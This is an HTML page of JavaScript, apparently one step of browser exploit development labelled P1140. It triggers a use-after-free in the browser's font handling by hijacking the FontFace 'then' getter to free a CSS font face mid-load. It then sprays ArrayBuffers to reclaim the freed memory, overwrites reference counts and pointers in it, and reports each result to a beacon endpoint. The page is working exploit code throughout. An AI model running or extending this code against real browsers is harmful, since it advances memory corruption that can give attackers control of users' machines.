<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1140</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body><div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

log('phase','=== P1140: FONTFACE PROPERTY ORACLE ===');
log('info','Capture FontFace this, reclaim CSSFontFace, probe properties through controlled memory');
B('P1140-START','t='+Date.now());

// ===== PART A: Capture + reclaim + property probe =====
var r=Date.now()%100000;
var uafHit=false;
var capturedFace=null;
var spray192=[];

var st=document.createElement('style');
st.textContent="@font-face{font-family:p"+r+";src:local(Arial);unicode-range:U+0042}";
document.head.appendChild(st);
// Also use this font on a div to ensure layout reference
var testDiv=document.createElement('div');
testDiv.style.fontFamily='p'+r+', serif';
testDiv.textContent='ABCDEFGHIJ';
document.body.appendChild(testDiv);
// Force layout so the font is resolved
testDiv.offsetHeight;

var ff=new FontFace('q'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(ff);void ff.loaded;

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(uafHit)return undefined;uafHit=true;

  // Capture this FontFace before freeing
  capturedFace=this;

  // Free the CSSFontFace
  if(st.parentNode)st.remove();
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;

  // Spray to reclaim
  for(var k=0;k<120;k++) spray192.push(new ArrayBuffer(192));

  try{document.fonts.check('1em p'+r);}catch(e){}
  return undefined;
},set:function(){}});

document.fonts.load('1em q'+r+', p'+r,'AB').then(function(){},function(){});

setTimeout(function(){
  delete FontFace.prototype.then;

  if(!capturedFace){
    B('P1140-MISS','no_capture');
    log('fail','FontFace not captured');
    return;
  }

  // Find the UAF buffer
  var uafBuf=null,uafView=null,uafIdx=-1;
  for(var k=0;k<spray192.length;k++){
    var v=new BigUint64Array(spray192[k]);
    if(v[0]===1n&&v[11]!==0n&&v[13]!==0n){
      var h=Number(v[11]>>32n);
      if(h>=0x10&&h<=0xFF){
        uafBuf=spray192[k];uafView=v;uafIdx=k;
        break;
      }
    }
  }

  log('info','capturedFace captured: '+(capturedFace?'YES':'NO'));
  log('info','UAF buffer: '+(uafView?'idx='+uafIdx+' q11='+hex64(uafView[11]):'NONE'));
  B('P1140-STATE','face='+(!!capturedFace)+'|uaf='+(!!uafView)+(uafView?'|q11='+hex64(uafView[11]):''));

  // ===== PART B: Probe capturedFace properties with ORIGINAL memory =====
  log('phase','--- Part B: Property reads on captured FontFace (original memory) ---');

  var props=['status','family','style','weight','stretch','unicodeRange','variant',
             'featureSettings','display','loaded'];
  var results={};

  for(var pi=0;pi<props.length;pi++){
    var p=props[pi];
    try{
      var val=capturedFace[p];
      var desc=(val===undefined)?'undefined':(val===null)?'null':
        (typeof val==='object'&&val.then)?'Promise':String(val).substring(0,80);
      results[p]=desc;
      log('ok','  '+p+' = '+desc);
    }catch(e){
      results[p]='ERR:'+e.message.substring(0,60);
      log('fail','  '+p+' threw: '+e.message.substring(0,80));
    }
  }
  B('P1140-PROPS-ORIG',JSON.stringify(results));

  // Try methods
  var methods=[
    ['load',function(){return capturedFace.load();}],
    ['fonts.has',function(){return document.fonts.has(capturedFace);}],
    ['fonts.check',function(){return document.fonts.check('1em '+capturedFace.family);}],
    ['toString',function(){return String(capturedFace);}],
    ['JSON',function(){return JSON.stringify(capturedFace);}]
  ];

  var mResults={};
  for(var mi=0;mi<methods.length;mi++){
    var m=methods[mi];
    try{
      var val=m[1]();
      var desc=(val===undefined)?'undefined':(val===null)?'null':
        (typeof val==='object'&&val.then)?'Promise':String(val).substring(0,80);
      mResults[m[0]]=desc;
      log('ok','  '+m[0]+'() = '+desc);
    }catch(e){
      mResults[m[0]]='ERR:'+e.message.substring(0,60);
      log('fail','  '+m[0]+'() threw: '+e.message.substring(0,80));
    }
  }
  B('P1140-METHODS-ORIG',JSON.stringify(mResults));

  if(!uafView){
    B('P1140-DONE','no_uaf_window');
    log('fail','No UAF window - cannot do Part C');
    return;
  }

  // ===== PART C: Modify UAF memory and re-probe =====
  log('phase','--- Part C: Write patterns and re-probe properties ---');

  // Save original values
  var originals=[];
  for(var q=0;q<uafView.length;q++) originals.push(uafView[q]);

  // Test 1: Set all to zeros and probe
  for(var q=0;q<uafView.length;q++) uafView[q]=0n;

  var zeroResults={};
  for(var pi=0;pi<props.length;pi++){
    var p=props[pi];
    try{
      var val=capturedFace[p];
      var desc=(val===undefined)?'undefined':(val===null)?'null':
        (typeof val==='object'&&val.then)?'Promise':String(val).substring(0,80);
      zeroResults[p]=desc;
    }catch(e){
      zeroResults[p]='ERR:'+e.message.substring(0,60);
    }
  }
  B('P1140-PROPS-ZERO',JSON.stringify(zeroResults));
  log('info','Zero-fill results: '+JSON.stringify(zeroResults).substring(0,200));

  // Test 2: Restore original + set q0 (refcount) to a large value
  for(var q=0;q<originals.length;q++) uafView[q]=originals[q];
  uafView[0]=0x1000n; // refcount=4096

  var rcResults={};
  for(var pi=0;pi<props.length;pi++){
    var p=props[pi];
    try{
      var val=capturedFace[p];
      var desc=(val===undefined)?'undefined':(val===null)?'null':
        (typeof val==='object'&&val.then)?'Promise':String(val).substring(0,80);
      rcResults[p]=desc;
    }catch(e){
      rcResults[p]='ERR:'+e.message.substring(0,60);
    }
  }
  B('P1140-PROPS-RC',JSON.stringify(rcResults));

  // Test 3: Null q11 (source pointer) and probe
  for(var q=0;q<originals.length;q++) uafView[q]=originals[q];
  uafView[11]=0n; // null source pointer

  var nullSrcResults={};
  for(var pi=0;pi<props.length;pi++){
    var p=props[pi];
    try{
      var val=capturedFace[p];
      var desc=(val===undefined)?'undefined':(val===null)?'null':
        (typeof val==='object'&&val.then)?'Promise':String(val).substring(0,80);
      nullSrcResults[p]=desc;
    }catch(e){
      nullSrcResults[p]='ERR:'+e.message.substring(0,60);
    }
  }
  B('P1140-PROPS-NSRC',JSON.stringify(nullSrcResults));
  log('info','Null-source results: '+JSON.stringify(nullSrcResults).substring(0,200));

  // Test 4: Set q11 to a known pattern and try to trigger layout with the font
  for(var q=0;q<originals.length;q++) uafView[q]=originals[q];
  uafView[11]=0xDEADBEEFCAFE0000n; // recognizable pattern

  // Try forcing layout that uses the font
  try{
    testDiv.style.display='none';
    testDiv.offsetHeight;
    testDiv.style.display='block';
    testDiv.offsetHeight;
  }catch(e){}

  // Try document.fonts operations
  var layoutResults={};
  try{
    var fcheck=document.fonts.check('1em p'+r);
    layoutResults.check=String(fcheck);
  }catch(e){layoutResults.check='ERR:'+e.message.substring(0,60);}

  try{
    document.fonts.forEach(function(face){
      layoutResults.forEach_count=(layoutResults.forEach_count||0)+1;
    });
  }catch(e){layoutResults.forEach='ERR:'+e.message.substring(0,60);}

  B('P1140-LAYOUT',JSON.stringify(layoutResults));
  log('info','Layout test: '+JSON.stringify(layoutResults));

  // Test 5: Check if property values CHANGED between original and zero
  var diffs=[];
  for(var p in zeroResults){
    if(results[p]!==zeroResults[p]){
      diffs.push(p+':'+results[p]+'->'+zeroResults[p]);
    }
  }

  if(diffs.length>0){
    log('win','PROPERTIES CHANGED BY MEMORY WRITE: '+diffs.join(', '));
    B('P1140-DIFFS',diffs.join('|'));
  }else{
    log('info','No property changes detected (FontFace may use own CSSFontFace, not the freed one)');
    B('P1140-DIFFS','none');
  }

  // Restore
  for(var q=0;q<originals.length;q++) uafView[q]=originals[q];

  // ===== PART D: Try document.fonts enumeration for CSS-connected faces =====
  log('phase','--- Part D: Enumerate document.fonts ---');
  var fontList=[];
  try{
    document.fonts.forEach(function(face){
      var info={};
      try{info.family=face.family;}catch(e){info.family='ERR';}
      try{info.status=face.status;}catch(e){info.status='ERR';}
      try{info.display=face.display;}catch(e){info.display='ERR';}
      fontList.push(info);
    });
  }catch(e){
    fontList.push({err:e.message.substring(0,80)});
  }
  B('P1140-FONTS',JSON.stringify(fontList));
  log('info','document.fonts: '+JSON.stringify(fontList));

  B('P1140-DONE','diffs='+diffs.length+'|fonts='+fontList.length);
  log('phase','=== DONE: '+diffs.length+' property diffs ===');
},15);
</script></body></html>
